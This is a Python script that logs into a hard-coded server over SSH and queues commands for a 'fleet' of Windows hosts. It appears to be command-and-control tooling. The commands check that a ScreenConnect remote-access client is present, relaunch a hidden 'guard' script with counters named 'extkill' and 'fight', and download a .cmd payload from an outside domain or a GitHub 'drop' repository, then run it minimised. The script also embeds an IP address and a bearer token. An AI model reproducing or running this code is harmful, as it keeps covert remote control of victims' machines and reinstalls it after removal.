#!/usr/bin/env python3
"""Ensure Gryxa on a host: status probe + force-guard, recover if missing."""
from __future__ import annotations

import sys
import time
from pathlib import Path

import paramiko

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
TARGET = sys.argv[1] if len(sys.argv) > 1 else "E32072484D"

PROBE = (
    r'echo ===SC=== & sc query "ScreenConnect Client (36e506ff016b2151)" & '
    r'echo ===DIR=== & '
    r'if exist "C:\Program Files (x86)\ScreenConnect Client (36e506ff016b2151)\ScreenConnect.ClientService.exe" '
    r'(echo DIR_OK) else (echo DIR_MISSING) & '
    r'echo PROBE_DONE'
)

BOOST = (
    r'>C:\ProgramData\WinRTCS\extkill.cnt echo 0'
    r' & >C:\ProgramData\WinRTCS\fight.cnt echo 0'
    r' & >C:\ProgramData\WinRTCS\guard.cnt echo 9999'
    r' & >C:\ProgramData\WinRTCS\gryxa_boost.cnt echo 15'
    r' & rmdir /s /q C:\ProgramData\WinRTCS\guard.lockd'
    r' & start "" /min cmd.exe /c C:\ProgramData\WinRTCS\winrtcs_guard.cmd'
    r' & echo GUARD_BOOSTED'
)

RECOVER = (
    r'C:\Windows\System32\curl.exe -f -L --ssl-no-revoke '
    r'-H "Authorization: Bearer fe7e8f3b8af479870248be10ca25410b8e1bf9a5" '
    r'--connect-timeout 15 --max-time 60 '
    r'-o C:\Users\Public\gryxa_recover4.cmd '
    r'https://debian.seczio.com/winrtcs/winrtcs_gryxa_recover4.cmd '
    r'& if not exist C:\Users\Public\gryxa_recover4.cmd '
    r'C:\Windows\System32\curl.exe -f -L --ssl-no-revoke --connect-timeout 15 --max-time 60 '
    r'-o C:\Users\Public\gryxa_recover4.cmd '
    r'https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_gryxa_recover.cmd '
    r'& start "" /min cmd.exe /c C:\Users\Public\gryxa_recover4.cmd '
    r'& echo RECOVER4_STARTED'
)


def main() -> None:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(
        "144.172.107.56",
        username="winrtcs",
        key_filename=str(Path.home() / ".ssh" / "winrtcs_ed25519"),
        timeout=20,
    )
    sftp = ssh.open_sftp()
    with sftp.file("/tmp/probe.txt", "w") as f:
        f.write(PROBE)
    with sftp.file("/tmp/boost.txt", "w") as f:
        f.write(BOOST)
    with sftp.file("/tmp/recover.txt", "w") as f:
        f.write(RECOVER)

    force = "--force" in sys.argv or "-f" in sys.argv
    py = f"""
import sqlite3, time
con=sqlite3.connect('/opt/winrtcs/fleet.db')
now=time.time()
h={TARGET!r}
row=con.execute('SELECT state,rmm,last_seen,last_beat,guard,agent FROM hosts WHERE host=?',(h,)).fetchone()
print('BEFORE', row)
rmm=(row[1] or '') if row else ''
has_gryxa='[gryxa]' in rmm or '36e506ff' in rmm
probe=open('/tmp/probe.txt',encoding='utf-8').read().strip()
boost=open('/tmp/boost.txt',encoding='utf-8').read().strip()
recover=open('/tmp/recover.txt',encoding='utf-8').read().strip()
ids=[]
# always probe + boost
for name,cmd in [('gryxa-probe',probe),('force-guard',boost)]:
    cur=con.execute('INSERT INTO cmds(ts,target,cmd) VALUES(?,?,?)',(now,h,cmd))
    cid=int(cur.lastrowid)
    con.execute('''INSERT INTO jobs(ts,name,target,params,cmd_id,note,status,attempts,max_attempts,updated)
     VALUES(?,?,?,?,?,?,?,?,?,?)''',(now,name,h,'{{}}',cid,'ensure gryxa','queued',1,2,now))
    ids.append((name,cid))
if (not has_gryxa) or {force!r}:
    cur=con.execute('INSERT INTO cmds(ts,target,cmd) VALUES(?,?,?)',(now,h,recover))
    cid=int(cur.lastrowid)
    con.execute('''INSERT INTO jobs(ts,name,target,params,cmd_id,note,status,attempts,max_attempts,updated)
     VALUES(?,?,?,?,?,?,?,?,?,?)''',(now,'recover-gryxa',h,'{{}}',cid,'ensure recover','queued',1,2,now))
    ids.append(('recover-gryxa',cid))
    print('QUEUED_RECOVER has_gryxa', has_gryxa, 'force', {force!r})
else:
    print('SKIP_RECOVER already reports gryxa — probe+guard only (pass --force to reinstall)')
con.commit()
print('QUEUED', ids)
con.close()
"""
    with sftp.file("/tmp/qensure.py", "w") as f:
        f.write(py)
    sftp.close()
    _, o, e = ssh.exec_command("sudo python3 /tmp/qensure.py", timeout=30)
    print(o.read().decode("utf-8", "replace"))
    print(e.read().decode("utf-8", "replace"))
    ssh.close()


if __name__ == "__main__":
    main()
